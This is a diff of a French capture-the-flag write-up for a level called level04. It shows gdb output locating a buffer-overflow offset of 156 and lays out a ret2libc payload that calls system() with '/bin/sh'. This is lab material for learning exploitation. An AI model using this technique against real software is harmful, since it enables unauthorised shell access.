@@ -117,21 +117,21 @@ La stack est exécutable, mais le check sur execve() nous empêche de lancer un 
 Pour trouver l'offset on va devoir spécifier à gdb de suivre l'exécution du process enfant et se servir comme d'habitude du [générateur de pattern](https://wiremask.eu/tools/buffer-overflow-pattern-generator/).
 
 `gdb level04`
-`set follow-fork-mode child`
-`r`
-```
-Starting program: /home/users/level04/level04
-[New process 3213]
-Give me some shellcode, k
-Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+- `set follow-fork-mode child`
+- `r`
+  ```
+  Starting program: /home/users/level04/level04
+  [New process 3213]
+  Give me some shellcode, k
+  Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
 
-Program received signal SIGSEGV, Segmentation fault.
-[Switching to process 3213]
-0x41326641 in ?? ()
-```
-- Le générateur de pattern nous indique un offset de 156 pour la valeur 0x41326641
+  Program received signal SIGSEGV, Segmentation fault.
+  [Switching to process 3213]
+  0x41326641 in ?? ()
+  ```
+  - Le générateur de pattern nous indique un offset de 156 pour la valeur 0x41326641
 
-Notre exploit sera composé comme suit: [ Offset de 80 (NopSled) ] [ Adresse system() ] [ Adresse retour (osef) ] [ Adresse "/bin/sh" ].
+Notre exploit sera composé comme suit: [ Offset de 156 (NopSled) ] [ Adresse system() ] [ Adresse retour (osef) ] [ Adresse "/bin/sh" ].
 
 ```
 (gdb) p system
